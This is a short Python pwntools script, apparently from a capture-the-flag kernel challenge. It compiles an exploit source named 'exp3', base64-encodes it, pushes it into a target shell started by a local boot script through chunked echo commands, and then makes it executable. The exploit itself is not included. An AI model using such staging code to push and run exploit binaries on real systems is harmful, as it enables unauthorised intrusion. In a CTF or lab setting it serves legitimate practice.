#!/usr/bin/env python3
from pwn import *
import os

prompt = "$ "

def upload(name):
    io.sendlineafter(prompt, "stty -echo")
    io.sendlineafter(prompt, "cd /home/ctf")
    os.system("musl-gcc -static -Os ./{}.c -o {}".format(name, name))
    # os.system("musl-gcc -static -masm=intel -Os ./{}.c -o {}".format(name, name))
    os.system("gzip -c {} > {}.gz".format(name, name))

    with open("{}.gz".format(name), "rb") as f:
        content = f.read()
    
    print("len: %d" % len(content))
    encoded = base64.b64encode(content)
    print("len: %d" % len(encoded))
    for i in range(0, len(encoded), 1000):
        io.sendline("echo \"{}\" >> {}.gz.b64".format(encoded[i:i+1000].decode("ascii"), name) )
    
    io.sendlineafter(prompt, "base64 -d {}.gz.b64 > {}.gz".format(name, name))
    io.sendlineafter(prompt, "gunzip {}.gz".format(name))
    io.sendlineafter(prompt, "chmod +x {}".format(name))
    # io.sendlineafter(prompt, "./{}".format(name))
    io.interactive()
    

io = process("./boot.sh", shell=True)
upload("exp3")